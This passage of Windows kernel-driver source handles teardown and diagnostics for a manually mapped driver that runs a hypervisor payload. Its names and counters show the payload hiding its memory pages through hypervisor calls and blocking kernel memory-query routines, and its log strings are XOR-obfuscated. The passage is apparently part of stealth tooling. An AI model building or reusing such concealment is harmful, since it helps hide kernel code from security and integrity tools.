static void mapdriver_ghv_or64(const mapctl_hv_diag& diag, payload_u64 off, payload_u64 mask)
{
    if (!diag.ghv || !off || !mask)
        return;

    __try
    {
        _InterlockedOr64((volatile LONG64*)(diag.ghv + off), (LONG64)mask);
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
    }
}

static bool mapdriver_diag_has_stop_offsets(const mapctl_hv_diag& diag)
{
    return diag.ghv &&
        diag.ghv_off_stop_phase &&
        diag.ghv_off_stop_expected_bitmap &&
        diag.ghv_off_stop_requested_bitmap &&
        diag.ghv_off_stop_before_vmcall_bitmap &&
        diag.ghv_off_stop_after_vmcall_bitmap &&
        diag.ghv_off_stop_ack_bitmap &&
        diag.ghv_off_stop_exception_bitmap &&
        diag.ghv_off_stop_cleanup_bitmap &&
        diag.ghv_off_stop_last_cpu &&
        diag.ghv_off_stop_result;
}

static void mapdriver_reset_hv_stop_diag(const mapctl_hv_diag& diag)
{
    if (!mapdriver_diag_has_stop_offsets(diag))
        return;

    mapdriver_ghv_write64(diag, diag.ghv_off_stop_phase, 0);
    mapdriver_ghv_write64(diag, diag.ghv_off_stop_expected_bitmap, 0);
    mapdriver_ghv_write64(diag, diag.ghv_off_stop_requested_bitmap, 0);
    mapdriver_ghv_write64(diag, diag.ghv_off_stop_before_vmcall_bitmap, 0);
    mapdriver_ghv_write64(diag, diag.ghv_off_stop_after_vmcall_bitmap, 0);
    mapdriver_ghv_write64(diag, diag.ghv_off_stop_ack_bitmap, 0);
    mapdriver_ghv_write64(diag, diag.ghv_off_stop_exception_bitmap, 0);
    mapdriver_ghv_write64(diag, diag.ghv_off_stop_cleanup_bitmap, 0);
    mapdriver_ghv_write64(diag, diag.ghv_off_stop_last_cpu, ~0ull);
    mapdriver_ghv_write64(diag, diag.ghv_off_stop_result, 0);
}

static void mapdriver_capture_hv_stop_diag(mapctl_full_unload* req, const mapctl_hv_diag& diag)
{
    if (!req || !mapdriver_diag_has_stop_offsets(diag))
        return;

    req->stop_phase = mapdriver_ghv_read64(diag, diag.ghv_off_stop_phase);
    req->stop_result = mapdriver_ghv_read64(diag, diag.ghv_off_stop_result);
    req->stop_expected = mapdriver_ghv_read64(diag, diag.ghv_off_stop_expected_bitmap);
    req->stop_requested = mapdriver_ghv_read64(diag, diag.ghv_off_stop_requested_bitmap);
    req->stop_before_vmcall = mapdriver_ghv_read64(diag, diag.ghv_off_stop_before_vmcall_bitmap);
    req->stop_after_vmcall = mapdriver_ghv_read64(diag, diag.ghv_off_stop_after_vmcall_bitmap);
    req->stop_ack = mapdriver_ghv_read64(diag, diag.ghv_off_stop_ack_bitmap);
    req->stop_exception = mapdriver_ghv_read64(diag, diag.ghv_off_stop_exception_bitmap);
    req->stop_cleanup = mapdriver_ghv_read64(diag, diag.ghv_off_stop_cleanup_bitmap);
    req->stop_last_cpu = mapdriver_ghv_read64(diag, diag.ghv_off_stop_last_cpu);

    // Reuse the existing printed self_stop line as the compact stop bitmap
    // view for both TestDriver::hv::stop() and payload self-stop.
    if (!req->selfstop_requested)
        req->selfstop_requested = req->stop_expected;
    if (!req->selfstop_after)
        req->selfstop_after = req->stop_after_vmcall;
    if (!req->selfstop_ack)
        req->selfstop_ack = req->stop_ack;
    if (!req->selfstop_exceptions)
        req->selfstop_exceptions = req->stop_exception;
    if (!req->selfstop_result)
        req->selfstop_result = req->stop_result ? PAYLOAD_RESULT_OK : PAYLOAD_RESULT_INVALID_CONTEXT;
}

static bool mapdriver_stop_resident_hv_without_testdriver(mapctl_full_unload* req)
{
    if (!req || !mapdriver_hv_ready())
        return false;

    mapctl_hv_diag diag = {};
    __try
    {
        auto copied = mapdriver_get_resident_hv_diag(&diag);
        if (!mapdriver_hv_diag_valid(diag, copied) ||
            !diag.vcpu_count ||
            !mapdriver_diag_has_stop_offsets(diag))
        {
            return false;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        return false;
    }

    payload_u64 count = diag.vcpu_count;
    if (count > 64)
        count = 64;
    if (!count)
        return false;

    payload_u64 expected = (count >= 64) ? ~0ull : ((1ull << count) - 1ull);
    req->selfstop_requested = expected;

    mapdriver_ghv_write64(diag, diag.ghv_off_stop_phase, 1);
    mapdriver_ghv_write64(diag, diag.ghv_off_stop_expected_bitmap, expected);
    mapdriver_ghv_write64(diag, diag.ghv_off_stop_requested_bitmap, 0);
    mapdriver_ghv_write64(diag, diag.ghv_off_stop_before_vmcall_bitmap, 0);
    mapdriver_ghv_write64(diag, diag.ghv_off_stop_after_vmcall_bitmap, 0);
    mapdriver_ghv_write64(diag, diag.ghv_off_stop_ack_bitmap, 0);
    mapdriver_ghv_write64(diag, diag.ghv_off_stop_exception_bitmap, 0);
    mapdriver_ghv_write64(diag, diag.ghv_off_stop_cleanup_bitmap, 0);
    mapdriver_ghv_write64(diag, diag.ghv_off_stop_last_cpu, ~0ull);
    mapdriver_ghv_write64(diag, diag.ghv_off_stop_result, 0);

    for (payload_u64 i = 0; i < count; ++i)
    {
        payload_u64 bit = 1ull << i;
        mapdriver_ghv_write64(diag, diag.ghv_off_stop_last_cpu, i);
        mapdriver_ghv_or64(diag, diag.ghv_off_stop_requested_bitmap, bit);

        KAFFINITY old_affinity = KeSetSystemAffinityThreadEx((KAFFINITY)bit);
        __try
        {
            mapdriver_ghv_or64(diag, diag.ghv_off_stop_before_vmcall_bitmap, bit);
            hv::vmcall_unload();
            mapdriver_ghv_or64(diag, diag.ghv_off_stop_after_vmcall_bitmap, bit);
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            mapdriver_ghv_or64(diag, diag.ghv_off_stop_exception_bitmap, bit);
        }
        KeRevertToUserAffinityThreadEx(old_affinity);
    }

    req->selfstop_after = mapdriver_ghv_read64(diag, diag.ghv_off_stop_after_vmcall_bitmap) & expected;
    req->selfstop_ack = mapdriver_ghv_read64(diag, diag.ghv_off_stop_ack_bitmap) & expected;
    req->selfstop_exceptions = mapdriver_ghv_read64(diag, diag.ghv_off_stop_exception_bitmap) & expected;

    bool ok = (req->selfstop_after == expected &&
        req->selfstop_ack == expected &&
        req->selfstop_exceptions == 0);

    mapdriver_ghv_write64(diag, diag.ghv_off_stop_phase, ok ? 2 : 0xE);
    mapdriver_ghv_write64(diag, diag.ghv_off_stop_result, ok ? 1 : 0);
    req->selfstop_result = ok ? PAYLOAD_RESULT_OK : PAYLOAD_RESULT_INVALID_CONTEXT;
    return ok;
}

static void mapdriver_free_resident_pool_blocks_for_unload(mapctl_full_unload* req)
{
    if (!req)
        return;

    payload_status status = {};
    if (!mapdriver_query_payload_status(&status) ||
        status.magic != PAYLOAD_STATUS_MAGIC ||
        !status.resident_pool_manifest ||
        !status.resident_pool_count)
    {
        return;
    }

    auto blocks = (payload_pool_block*)ExAllocatePoolWithTag(
        NonPagedPoolNx,
        sizeof(payload_pool_block) * kMapdriverMaxResidentPoolBlocks,
        'pRfP');
    if (!blocks)
    {
        req->pool_free_fail++;
        return;
    }

    payload_u64 count = mapdriver_snapshot_resident_pool_blocks(
        blocks,
        kMapdriverMaxResidentPoolBlocks,
        &status,
        "full-unload",
        "free");

    __try
    {
        for (payload_u64 i = 0; i < count; ++i)
        {
            payload_pool_block b = blocks[i];
            if (!b.va || !b.bytes)
                continue;

            //
            // This path is only used when TestDriver's image has already been
            // released and we had to stop VT through the resident payload bridge
            // instead of TestDriver::DriverUnload/hv::stop().  In that state the
            // payload manifest is a stale copy of TestDriver PoolManager records;
            // a bad/missing allocator flag must not be allowed to reach
            // ExFreePoolWithTag because Windows turns an invalid pool free into
            // BAD_POOL_CALLER 0xC2 (seen in 060326-4578-01.dmp at mapDriver+245b).
            //
            // Current resident TestDriver pool allocations are expected to be
            // MmAllocateIndependentPages-backed.  Therefore:
            //   * explicit INDEPENDENT -> free with MmFreeIndependentPages;
            //   * missing/zero flags    -> also treat as independent;
            //   * explicit FALLBACK     -> skip here (leak beats BSOD; the normal
            //                             live TestDriver unload still frees it).
            //
            if (b.flags & PAYLOAD_POOL_BLOCK_FLAG_FALLBACK)
            {
                req->pool_free_fail++;
                continue;
            }

            if (!MmFreeIndependentPages)
            {
                req->pool_free_fail++;
                continue;
            }

            __try
            {
                RtlSecureZeroMemory((PVOID)b.va, (SIZE_T)b.bytes);
                MmFreeIndependentPages((PVOID)b.va, (SIZE_T)b.bytes);

                req->pool_free_blocks++;
                req->pool_free_bytes += b.bytes;
            }
            __except (EXCEPTION_EXECUTE_HANDLER)
            {
                req->pool_free_fail++;
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        req->pool_free_fail++;
    }

    RtlSecureZeroMemory(blocks, sizeof(payload_pool_block) * kMapdriverMaxResidentPoolBlocks);
    ExFreePoolWithTag(blocks, 'pRfP');
}

static void mapdriver_full_unload_runtime(mapctl_full_unload* req)
{
    if (!req)
        return;

    req->result = PAYLOAD_RESULT_INVALID_CONTEXT;
    req->hv_before = mapdriver_hv_ready() ? 1 : 0;
    req->hv_after = req->hv_before;
    req->keep_cleared = 0;
    req->test_before = (payload_u64)Utils::imageBase;
    req->payload_before = (payload_u64)Utils::payloadBase;
    req->test_after = req->test_before;
    req->payload_after = req->payload_before;
    req->control_delete_queued = 0;
    req->unhide_pfns = 0;
    req->unhide_cpus = 0;
    req->unhide_expected = 0;
    req->unhide_done = 0;
    req->unhide_ok = 0;
    req->restore_rsp_requested = 0;
    req->restore_rsp_done = 0;
    req->restore_rsp_result = 0;
    req->restore_rip_requested = 0;
    req->restore_rip_done = 0;
    req->restore_rip_result = 0;
    req->selfstop_requested = 0;
    req->selfstop_after = 0;
    req->selfstop_ack = 0;
    req->selfstop_exceptions = 0;
    req->selfstop_result = 0;
    req->pool_free_blocks = 0;
    req->pool_free_bytes = 0;
    req->pool_free_fail = 0;
    req->test_unloaded_before_state = Utils::testDriverUnloaded ? 1 : 0;
    req->test_quarantined_before_state = Utils::testDriverImageQuarantined ? 1 : 0;
    req->test_unload_called_before_state = Utils::testDriverUnloadCallbackCalled ? 1 : 0;
    req->test_unloaded_after_stop = 0;
    req->test_quarantined_after_stop = 0;
    req->test_unload_called_after_stop = 0;
    req->boot_flags_ptr = g_testdriver_boot_flags_ptr;
    req->boot_flags_before = 0;
    req->boot_flags_after = 0;
    req->stop_phase = 0;
    req->stop_result = 0;
    req->stop_expected = 0;
    req->stop_requested = 0;
    req->stop_before_vmcall = 0;
    req->stop_after_vmcall = 0;
    req->stop_ack = 0;
    req->stop_exception = 0;
    req->stop_cleanup = 0;
    req->stop_last_cpu = 0;

    if (req->magic != MAPCTL_FULL_UNLOAD_MAGIC ||
        req->size < sizeof(mapctl_full_unload) ||
        req->arm != MAPCTL_FULL_UNLOAD_ARM)
    {
        return;
    }

    bool detached_before = (g_payload_detached != 0);

    LOG_DEBUG(_XOR_("[mapDriver] full_unload enter hv=%llu test=%p payload=%p detached=%d flags=0x%llX\n"),
        req->hv_before, Utils::imageBase, Utils::payloadBase, (int)detached_before, req->flags);
    mapdriver_log_payload_status("full-unload-before");

    if (detached_before && req->hv_before)
    {
#if MAPDRIVER_FULL_UNLOAD_PRE_UNHIDE_ENABLED
        auto unhide = mapdriver_unhide_payload_memory("full-unload-before-test-unload");
        req->unhide_pfns = unhide.pfn_count;
        req->unhide_cpus = unhide.cpu_count;
        req->unhide_expected = unhide.expected_calls;
        req->unhide_done = unhide.done_calls;
        req->unhide_ok = (unhide.expected_calls != 0 && unhide.done_calls == unhide.expected_calls) ? 1 : 0;

        if (!req->unhide_ok)
        {
            LOG_DEBUG(_XOR_("[mapDriver] full_unload continuing after incomplete unhide: pfns=%llu cpus=%llu done=%llu expected=%llu\n"),
                req->unhide_pfns, req->unhide_cpus, req->unhide_done, req->unhide_expected);
        }
#else
        // No-dump VT reset was reproduced in pre-unhide before DriverUnload.
        // Keep this baseline free of unhide VMCALLs; hide is also disabled in
        // base.h for this build so there should be nothing to restore here.
        req->unhide_ok = 1;
        LOG_DEBUG(_XOR_("[mapDriver] full_unload pre-unhide skipped for unload-stability baseline\n"));
#endif
    }
    else
    {
        req->unhide_ok = 1;
    }

    if (req->flags & MAPCTL_FULL_UNLOAD_PREFLIGHT_ONLY)
    {
        req->hv_after = mapdriver_hv_ready() ? 1 : 0;
        req->test_after = (payload_u64)Utils::imageBase;
        req->payload_after = (payload_u64)Utils::payloadBase;
        req->result = req->unhide_ok ? PAYLOAD_RESULT_OK : PAYLOAD_RESULT_INVALID_CONTEXT;
        LOG_DEBUG(_XOR_("[mapDriver] full_unload preflight leave result=0x%llX unhide=%llu/%llu\n"),
            req->result, req->unhide_done, req->unhide_expected);
        return;
    }

    // 逆序卸载第 1 步：在停止 VT / VtResidentPayload 之前，优先卸载 Machenike 载荷，
    // 确保 Machenike 的 VtEngine::Cleanup 可通过活跃 VMCALL 桥接还原自身隐藏页并销毁设备。
    Utils::UnloadMachenike(g_host_driver_object);

    // Keep the payload VM-exit bridge active until hv::stop() devirtualizes
    // every CPU. The bridge pass-throughs hypercall_unload to the original
    // TestDriver handler, then its asm epilogue performs VMXOFF/IRET. Restoring
    // HOST_RIP here would create a window where active resident payload hooks
    // are delivered to the old handler.

    mapctl_hv_diag stop_diag = {};
    bool stop_diag_ready = false;
    if (req->hv_before)
    {
        __try
        {
            auto copied = mapdriver_get_resident_hv_diag(&stop_diag);
            stop_diag_ready = mapdriver_hv_diag_valid(stop_diag, copied) &&
                mapdriver_diag_has_stop_offsets(stop_diag);
            if (stop_diag_ready)
                mapdriver_reset_hv_stop_diag(stop_diag);
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            stop_diag_ready = false;
        }
    }

    req->boot_flags_ptr = g_testdriver_boot_flags_ptr;
    if (mapdriver_va_in_testdriver_image(req->boot_flags_ptr))
        mapdriver_read_u64_safe(req->boot_flags_ptr, &req->boot_flags_before);

    if (req->hv_before)
    {
        bool keep_clear_hypercall = false;
        bool keep_clear_direct = false;
        __try
        {
            keep_clear_hypercall = (hv::vmcall_set_keep_hv_on_unload(false) != 0);
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            keep_clear_hypercall = false;
        }

        // In resident bridge mode the SET_KEEP hypercall may be handled by the
        // payload shadow after legacy detach, while TestDriver::Driver_Unload
        // checks the original g_yvt_boot_flags in the quarantined TestDriver
        // image.  Clear the original pointer too; if KEEP remains set,
        // DriverUnload returns before hv::stop(), leaving VT active.
        keep_clear_direct = mapdriver_direct_set_keep_hv_on_unload(false);
        req->keep_cleared = (keep_clear_hypercall || keep_clear_direct) ? 1 : 0;
        LOG_DEBUG(_XOR_("[mapDriver] full_unload clear KEEP hypercall=%d direct=%d result=%llu\n"),
            (int)keep_clear_hypercall,
            (int)keep_clear_direct,
            req->keep_cleared);
    }

    req->boot_flags_ptr = g_testdriver_boot_flags_ptr ? g_testdriver_boot_flags_ptr : req->boot_flags_ptr;
    if (mapdriver_va_in_testdriver_image(req->boot_flags_ptr))
        mapdriver_read_u64_safe(req->boot_flags_ptr, &req->boot_flags_after);

    // Handoff only quarantines TestDriver and does not call DriverUnload.
    // For a real teardown, clear KEEP through the hypercall above and allow
    // the unload callback to run exactly once so TestDriver can call hv::stop()
    // and free its VT runtime allocations before the mapped image is released.
    bool self_stop_used = false;

    if (Utils::imageBase)
    {
        if (req->hv_before || !Utils::testDriverUnloaded)
        {
            Utils::testDriverUnloaded = FALSE;
            // Always quarantine first. If hv::stop() fails closed, the TestDriver
            // image must remain mapped because some vCPU may still have HOST_RIP /
            // root-mode references into it. Free it only after hv_ready is false.
            Utils::UnloadDriverEx(FALSE);
        }
        else
        {
            Utils::testDriverImageQuarantined = TRUE;
        }
        if (stop_diag_ready)
            mapdriver_capture_hv_stop_diag(req, stop_diag);
    }
    else if (detached_before && req->hv_before)
    {
        // One-key/freetest validation may have already released TestDriver.
        // In that state there is no safe DriverUnload entry left to call; stop
        // every vCPU through the payload VM-exit bridge itself, then free the
        // adopted TestDriver pool blocks from the payload manifest.
        self_stop_used = mapdriver_stop_resident_hv_without_testdriver(req);
        LOG_DEBUG(_XOR_("[mapDriver] full_unload payload self-stop result=0x%llX after=0x%llX ack=0x%llX exc=0x%llX\n"),
            req->selfstop_result,
            req->selfstop_after,
            req->selfstop_ack,
            req->selfstop_exceptions);
    }

    req->test_unloaded_after_stop = Utils::testDriverUnloaded ? 1 : 0;
    req->test_quarantined_after_stop = Utils::testDriverImageQuarantined ? 1 : 0;
    req->test_unload_called_after_stop = Utils::testDriverUnloadCallbackCalled ? 1 : 0;

    if (req->flags & MAPCTL_FULL_UNLOAD_STOP_LEGACY_ONLY)
    {
        req->hv_after = mapdriver_hv_ready() ? 1 : 0;
        req->test_after = (payload_u64)Utils::imageBase;
        req->payload_after = (payload_u64)Utils::payloadBase;
        req->result = (!req->hv_after) ? PAYLOAD_RESULT_OK : PAYLOAD_RESULT_INVALID_CONTEXT;
        LOG_DEBUG(_XOR_("[mapDriver] full_unload stoptest leave result=0x%llX hv_after=%llu test=%p payload=%p\n"),
            req->result, req->hv_after, Utils::imageBase, Utils::payloadBase);
        return;
    }

    if (detached_before && mapdriver_hv_ready())
    {
        LOG_DEBUG(_XOR_("[mapDriver] full_unload aborted: hv still ready after TestDriver unload; skip hidden payload direct execution\n"));
        req->hv_after = 1;
        req->test_after = (payload_u64)Utils::imageBase;
        req->payload_after = (payload_u64)Utils::payloadBase;
        return;
    }

    if (Utils::imageBase)
    {
        Utils::UnloadDriverEx(TRUE);
    }

    if (detached_before && Utils::payloadBase)
    {
        // After resident handoff the WDM DriverUnload field is no longer a
        // trusted teardown entry.  Stop through payload exports instead, then
        // free the image/arena below.
        Utils::payloadDriver.DriverUnload = nullptr;
        LOG_DEBUG(_XOR_("[mapDriver] detached payload teardown uses stop export, DriverUnload suppressed\n"));
    }

    if (self_stop_used)
        mapdriver_free_resident_pool_blocks_for_unload(req);

    _InterlockedExchange(&g_payload_detached, 0);
    Utils::UnloadPayload();
    if (!mapdriver_hv_ready())
        Utils::FreePayloadArena();
    Util::PoolManagerUninitialize();

    req->hv_after = mapdriver_hv_ready() ? 1 : 0;
    req->test_after = (payload_u64)Utils::imageBase;
    req->payload_after = (payload_u64)Utils::payloadBase;
    req->control_delete_queued = (req->flags & MAPCTL_FULL_UNLOAD_DELETE_CONTROL) ? 1 : 0;
    req->result = (!req->hv_after && !req->test_after && !req->payload_after)
        ? PAYLOAD_RESULT_OK
        : PAYLOAD_RESULT_INVALID_CONTEXT;

    LOG_DEBUG(_XOR_("[mapDriver] full_unload leave result=0x%llX hv_after=%llu test=%p payload=%p delete_ctl=%llu\n"),
        req->result, req->hv_after, Utils::imageBase, Utils::payloadBase, req->control_delete_queued);
}

EXTERN_C __declspec(dllexport) VOID unload_driver(PDRIVER_OBJECT DriverObject)
{
    Utils::UnloadMachenike(DriverObject ? DriverObject : g_host_driver_object);

    mapctl_full_unload req = {};
    req.magic = MAPCTL_FULL_UNLOAD_MAGIC;
    req.size = sizeof(req);
    req.arm = MAPCTL_FULL_UNLOAD_ARM;
    req.flags = 0;

    // Real mapDriver unload must be a full teardown, not just "detach mapDriver".
    // In one-key validation mode TestDriver may already be freed, so this path
    // also covers the payload-bridge self-stop flow used by MAPCTL_IOCTL_FULL_UNLOAD.
    for (ULONG attempt = 0; attempt <= MAPDRIVER_UNLOAD_RETRY_COUNT; ++attempt)
    {
        RtlZeroMemory(&req, sizeof(req));
        req.magic = MAPCTL_FULL_UNLOAD_MAGIC;
        req.size = sizeof(req);
        req.arm = MAPCTL_FULL_UNLOAD_ARM;
        req.flags = 0;

        mapdriver_full_unload_runtime(&req);
        if (req.result == PAYLOAD_RESULT_OK)
            break;

        if (attempt == MAPDRIVER_UNLOAD_RETRY_COUNT)
            break;

        LOG_DEBUG(_XOR_("[mapDriver] DriverUnload teardown retry %lu result=0x%llX hv=%llu test=0x%llX payload=0x%llX\n"),
            attempt + 1,
            req.result,
            req.hv_after,
            req.test_after,
            req.payload_after);
        mapdriver_wait_ms((LONG)MAPDRIVER_UNLOAD_RETRY_DELAY_MS);
    }

    if (req.result != PAYLOAD_RESULT_OK)
    {
        LOG_DEBUG(_XOR_("[mapDriver] DriverUnload full teardown incomplete result=0x%llX hv_after=%llu test=0x%llX payload=0x%llX self=0x%llX ack=0x%llX exc=0x%llX\n"),
            req.result,
            req.hv_after,
            req.test_after,
            req.payload_after,
            req.selfstop_result,
            req.selfstop_ack,
            req.selfstop_exceptions);

        // Last-resort compatibility cleanup for non-resident bootstrap cases.
        // If resident HV is still active, mapdriver_unload_common(false) will
        // preserve the TestDriver image instead of freeing live HOST_RIP refs.
        mapdriver_unload_common(DriverObject, false);
    }

    mapdriver_delete_control_device();

    LOG_DEBUG(_XOR_("[mapDriver] unload_driver leave result=0x%llX hv_after=%llu test=0x%llX payload=0x%llX\n"),
        req.result,
        req.hv_after,
        req.test_after,
        req.payload_after);
}

static void mapdriver_fill_control_status(mapctl_status* out)
{
    if (!out)
        return;

    RtlZeroMemory(out, sizeof(*out));
    out->magic = MAPCTL_STATUS_MAGIC;
    out->hv_ready = mapdriver_hv_ready() ? 1 : 0;
    out->payload_detached = (payload_u64)g_payload_detached;
    // If the mapped TestDriver image is gone, report it as unloaded/quarantined
    // even if an older intermediate path left the boolean bookkeeping stale.
    // This keeps `payload_ctl status map` aligned with the actual lifecycle
    // state: no image base/size means there is no TestDriver code to return to.
    bool test_image_present = Utils::imageBase && Utils::imageSize;
    out->test_unloaded = (Utils::testDriverUnloaded || !test_image_present) ? 1 : 0;
    out->test_quarantined = (Utils::testDriverImageQuarantined || !test_image_present) ? 1 : 0;
    out->test_base = (payload_u64)Utils::imageBase;
    out->test_size = (payload_u64)Utils::imageSize;
    out->payload_base = (payload_u64)Utils::payloadBase;
    out->payload_size = (payload_u64)Utils::payloadSize;
    out->payload_exports = (payload_u64)Utils::payloadExports;

    if (mapdriver_query_payload_status(&out->payload))
    {
        out->payload_independent = out->payload.independent;
        out->payload_external_refs = out->payload.external_ref_flags;
        out->payload_barrier_ok = mapdriver_payload_barrier_ready(&out->payload) ? 1 : 0;
    }
    out->machenike_loaded = (Utils::machenikeLoaded && Utils::machenikeBase) ? 1 : 0;
    out->machenike_mode = (payload_u64)Utils::machenikeMode;
    out->machenike_base = (payload_u64)Utils::machenikeBase;
    out->machenike_size = (payload_u64)Utils::machenikeSize;
}

static void mapdriver_fill_migration_check(mapctl_migration_check* out)
{
    if (!out)
        return;

    RtlZeroMemory(out, sizeof(*out));
    out->magic = MAPCTL_MIGRATE_CHECK_MAGIC;
    out->size = sizeof(*out);

    if (mapdriver_query_payload_status(&out->payload) &&
        mapdriver_payload_barrier_ready(&out->payload))
    {
        out->flags |= MAPCTL_MIGRATE_CHECK_PAYLOAD_READY;
    }

    __try
    {
        auto copied = mapdriver_get_resident_hv_diag(&out->diag);
        if (mapdriver_hv_diag_valid(out->diag, copied) &&
            mapdriver_hv_diag_migration_ready(out->diag))
            out->flags |= MAPCTL_MIGRATE_CHECK_HV_DIAG_READY;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        RtlZeroMemory(&out->diag, sizeof(out->diag));
    }

    if (out->flags & MAPCTL_MIGRATE_CHECK_HV_DIAG_READY)
    {
        if (out->diag.vmcs_host_rip && out->diag.vmcs_host_rip == out->diag.vm_exit)
            out->flags |= MAPCTL_MIGRATE_CHECK_OLD_RIP_IS_VMEXIT;

        if (out->payload.vmexit_trampoline &&
            out->diag.vmcs_host_rip == out->payload.vmexit_trampoline)
        {
            out->flags |= MAPCTL_MIGRATE_CHECK_RIP_IN_PAYLOAD_TRAMP;
        }

        if (out->payload.vmexit_bridge &&
            out->diag.vmcs_host_rip == out->payload.vmexit_bridge)
        {
            out->flags |= MAPCTL_MIGRATE_CHECK_RIP_IN_PAYLOAD_BRIDGE;
        }

        if (out->diag.current_host_stack &&
            out->diag.host_stack_size &&
            out->diag.vmcs_host_rsp >= out->diag.current_host_stack &&
            out->diag.vmcs_host_rsp < (out->diag.current_host_stack + out->diag.host_stack_size))
        {
            out->flags |= MAPCTL_MIGRATE_CHECK_OLD_RSP_IN_STACK;
        }

        if (out->payload.host_stack_base &&
            out->payload.host_stack_size &&
            out->payload.host_stack_desc_base &&
            out->payload.host_stack_desc_count &&
            out->payload.host_stack_first_rsp >= out->payload.host_stack_base &&
            out->payload.host_stack_first_rsp < (out->payload.host_stack_base + out->payload.host_stack_size))
        {
            out->flags |= MAPCTL_MIGRATE_CHECK_PAYLOAD_STACK_READY;
        }

        if (out->payload.host_stack_base &&
            out->payload.host_stack_size &&
            out->diag.vmcs_host_rsp >= out->payload.host_stack_base &&
            out->diag.vmcs_host_rsp < (out->payload.host_stack_base + out->payload.host_stack_size))
        {
            out->flags |= MAPCTL_MIGRATE_CHECK_RSP_IN_PAYLOAD;
        }

        if (out->diag.vcpu_count && out->payload.host_stack_desc_count &&
            out->diag.vcpu_count <= out->payload.host_stack_desc_count)
        {
            out->flags |= MAPCTL_MIGRATE_CHECK_VCPU_COUNT_FITS;
        }

        if (out->payload.vmexit_trampoline &&
            out->payload.vmexit_target &&
            out->payload.vmexit_target == out->diag.vm_exit)
        {
            out->flags |= MAPCTL_MIGRATE_CHECK_VMEXIT_TRAMP_READY;
        }

        if (out->payload.vmexit_bridge &&
            out->payload.vmexit_bridge_target &&
            out->diag.handle_vm_exit &&
            out->payload.vmexit_bridge_target == out->diag.handle_vm_exit)
        {
            out->flags |= MAPCTL_MIGRATE_CHECK_VMEXIT_BRIDGE_READY;
        }
    }

    UINT64 required =
        MAPCTL_MIGRATE_CHECK_PAYLOAD_READY |
        MAPCTL_MIGRATE_CHECK_HV_DIAG_READY |
        MAPCTL_MIGRATE_CHECK_PAYLOAD_STACK_READY |
        MAPCTL_MIGRATE_CHECK_VCPU_COUNT_FITS |
        MAPCTL_MIGRATE_CHECK_VMEXIT_TRAMP_READY;

    bool rip_ok = (out->flags & (MAPCTL_MIGRATE_CHECK_OLD_RIP_IS_VMEXIT | MAPCTL_MIGRATE_CHECK_RIP_IN_PAYLOAD_TRAMP | MAPCTL_MIGRATE_CHECK_RIP_IN_PAYLOAD_BRIDGE)) != 0;
    bool rsp_ok = (out->flags & (MAPCTL_MIGRATE_CHECK_OLD_RSP_IN_STACK | MAPCTL_MIGRATE_CHECK_RSP_IN_PAYLOAD)) != 0;
    out->result = (((out->flags & required) == required) && rip_ok && rsp_ok)
        ? PAYLOAD_RESULT_OK
        : PAYLOAD_RESULT_INVALID_CONTEXT;
}

static void mapdriver_memcheck_control(mapctl_memcheck* req)
{
    if (!req)
        return;

    if (!req->flags)
        req->flags = MAPCTL_MEMCHECK_FLAG_DATA_DEFAULT;
    req->magic = MAPCTL_MEMCHECK_MAGIC;
    req->size = sizeof(*req);
    req->result = PAYLOAD_RESULT_INVALID_CONTEXT;

    if (!mapdriver_hv_ready())
    {
        req->verify_fail++;
        req->done = 1;
        return;
    }

    __try
    {
        payload_u64 result = hv::vmcall_verify_hide_pfn_list(req, sizeof(*req));
        if (result != PAYLOAD_RESULT_OK && req->result == PAYLOAD_RESULT_INVALID_CONTEXT)
            req->result = result ? result : PAYLOAD_RESULT_INVALID_CONTEXT;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        req->result = PAYLOAD_RESULT_INVALID_CONTEXT;
        req->verify_fail++;
        req->done = 1;
    }
}

static void mapdriver_mmtest_snapshot(mapctl_mmtest* req, const payload_status& ps, bool after)
{
    if (!req)
        return;

    if (after)
    {
        req->after_mmcm_hits = ps.mmcm_hits;
        req->after_mmcm_blocked = ps.mmcm_blocked;
        req->after_mmcvm_hits = ps.mmcvm_hits;
        req->after_mmcvm_blocked = ps.mmcvm_blocked;
        req->after_mmisav_hits = ps.mmisav_hits;
        req->after_mmisav_blocked = ps.mmisav_blocked;
        req->after_mmmio_hits = ps.mmmio_hits;
        req->after_mmmio_blocked = ps.mmmio_blocked;
        req->after_ntqvm_hits = ps.ntqvm_hits;
        req->after_ntqvm_blocked = ps.ntqvm_blocked;
        req->after_mmgpa_hits = ps.mmgpa_hits;
        req->after_mmgpa_blocked = ps.mmgpa_blocked;
    }
    else
    {
        req->before_mmcm_hits = ps.mmcm_hits;
        req->before_mmcm_blocked = ps.mmcm_blocked;
        req->before_mmcvm_hits = ps.mmcvm_hits;
        req->before_mmcvm_blocked = ps.mmcvm_blocked;
        req->before_mmisav_hits = ps.mmisav_hits;
        req->before_mmisav_blocked = ps.mmisav_blocked;
        req->before_mmmio_hits = ps.mmmio_hits;
        req->before_mmmio_blocked = ps.mmmio_blocked;
        req->before_ntqvm_hits = ps.ntqvm_hits;
        req->before_ntqvm_blocked = ps.ntqvm_blocked;
        req->before_mmgpa_hits = ps.mmgpa_hits;
        req->before_mmgpa_blocked = ps.mmgpa_blocked;
    }
}

static payload_u64 mapdriver_mmtest_real_pa(payload_u64 va)
{
    payload_u64 pa = 0;

    __try
    {
        if (mapdriver_hv_ready())
            pa = hv::vmcall_get_physical_address(0, va);
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        pa = 0;
    }

    if (!pa)
    {
        __try
        {
            PHYSICAL_ADDRESS physical = MmGetPhysicalAddress((PVOID)va);
            pa = (payload_u64)physical.QuadPart;
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            pa = 0;
        }
    }

    return pa;
}

static bool mapdriver_mmtest_pick_target(mapctl_mmtest* req, const payload_status& ps)
{
    if (!req || ps.magic != PAYLOAD_STATUS_MAGIC)
        return false;

    payload_u64 kind = req->target_kind ? req->target_kind : MAPCTL_MEMORY_AUDIT_KIND_ARENA;
    payload_u64 va = 0;
    payload_u64 size = 0;

    auto choose = [&](payload_u64 k, payload_u64 b, payload_u64 s) -> bool
    {
        if (!b || !s)
            return false;
        req->target_kind = k;
